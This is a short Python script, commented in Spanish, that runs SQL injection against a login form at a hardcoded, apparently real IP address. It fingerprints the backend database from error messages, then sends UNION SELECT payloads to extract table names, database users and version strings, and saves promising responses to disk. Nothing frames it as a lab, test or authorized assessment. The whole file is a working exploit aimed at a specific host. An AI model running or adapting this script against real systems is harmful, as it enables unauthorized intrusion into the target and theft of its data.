import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DatabaseExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def identify_database(self):
        """Identifica el tipo de base de datos"""
        print("[*] Identificando tipo de base de datos...")
        
        # Payloads específicos por database
        db_payloads = {
            "MySQL": ["' AND 1=1--", "' AND mysql_version()--"],
            "Oracle": ["' AND 1=1--", "' AND (SELECT version FROM v$instance) IS NOT NULL--"],
            "PostgreSQL": ["' AND 1=1--", "' AND version()--"],
            "SQL Server": ["' AND 1=1--", "' AND @@version--"]
        }
        
        login_data_base = {
            'yAccion': 'login',
            'yIntentos': '1',
            'yUsuario': '',
            'xContrasena': 'test'
        }
        
        for db_type, payloads in db_payloads.items():
            for payload in payloads:
                try:
                    login_data = login_data_base.copy()
                    login_data['xUsuario'] = payload
                    
                    response = self.session.post(self.base_url, data=login_data, timeout=8)
                    
                    # Analizar respuesta para identificar DB
                    if "MySQL" in response.text or "mysql" in response.text.lower():
                        print(f"[!] Posible MySQL detectado")
                        return "MySQL"
                    elif "Oracle" in response.text or "ORA-" in response.text:
                        print(f"[!] Posible Oracle detectado")
                        return "Oracle"
                    elif "PostgreSQL" in response.text or "postgres" in response.text.lower():
                        print(f"[!] Posible PostgreSQL detectado")
                        return "PostgreSQL"
                    elif "SQL Server" in response.text or "Microsoft" in response.text:
                        print(f"[!] Posible SQL Server detectado")
                        return "SQL Server"
                        
                except Exception as e:
                    pass
        
        print("[-] No se pudo identificar la base de datos")
        return "Unknown"

    def extract_data_via_sql(self):
        """Extrae datos via SQL Injection"""
        print("\n[*] Intentando extraer datos...")
        
        # Payloads para extraer información
        extraction_payloads = [
            # Extraer nombres de tablas
            "admin' UNION SELECT table_name,2,3 FROM information_schema.tables--",
            "admin' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'--",
            
            # Extraer usuarios de la base de datos
            "admin' UNION SELECT user,2,3 FROM dual--",
            "admin' UNION SELECT current_user,2,3--",
            
            # Extraer version
            "admin' UNION SELECT @@version,2,3--"
        ]
        
        for payload in extraction_payloads:
            try:
                login_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': payload,
                    'xContrasena': 'test'
                }
                
                response = self.session.post(self.base_url, data=login_data, timeout=10)
                print(f"[*] Probando: {payload[:50]}...")
                
                # Buscar datos en la respuesta
                if "error" not in response.text.lower() and len(response.text) > 1000:
                    print(f"[!] Respuesta interesante obtenida")
                    with open(f"extraction_{hash(payload)}.html", "w", encoding="utf-8") as f:
                        f.write(response.text)
                    
            except Exception as e:
                print(f"[-] Error: {e}")

# Ejecutar
db_exploiter = DatabaseExploiter("189.254.143.102")
db_type = db_exploiter.identify_database()
print(f"[*] Base de datos identificada: {db_type}")
db_exploiter.extract_data_via_sql()